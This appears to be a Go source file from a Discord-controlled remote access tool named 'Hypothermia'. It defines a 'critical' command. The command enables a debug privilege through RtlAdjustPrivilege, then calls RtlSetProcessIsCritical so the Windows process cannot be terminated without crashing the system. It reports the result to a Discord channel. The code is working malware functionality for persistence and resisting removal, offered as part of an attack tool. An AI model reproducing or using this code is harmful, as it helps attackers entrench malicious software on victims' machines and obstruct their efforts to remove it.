package commands

import (
	"fmt"
	"syscall"
	"unsafe"

	"Hypothermia/src/misc"
	"github.com/bwmarrin/discordgo"
)

const (
	critFailed  string = "🟥 Failed to make hypothermia critical: %s"
	critSuccess string = "🟩 Successfully made hypothermia critical."
)

var setCritical *syscall.LazyProc = misc.NTdll.NewProc("RtlSetProcessIsCritical")

func (*Criticalommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	var old int32

	ret, _, err := misc.AdjustPrivilege.Call(
		uintptr(20),
		uintptr(1),
		uintptr(0),
		uintptr(unsafe.Pointer(&old)),
	)

	if ret != 0 {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(misc.ERROR_F_ADJUST_PRIVILEGE, err), m.Reference())
		return
	}

	ret, _, err = setCritical.Call(
		uintptr(1),
		uintptr(0),
		uintptr(0),
	)

	if ret != 0 {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(critFailed, err), m.Reference())
		return
	}

	s.ChannelMessageSendReply(m.ChannelID, critSuccess, m.Reference())
}

func (*Criticalommand) Name() string {
	return "critical"
}

func (*Criticalommand) Info() string {
	return "makes hypothermia a critical process"
}

type Criticalommand struct{}
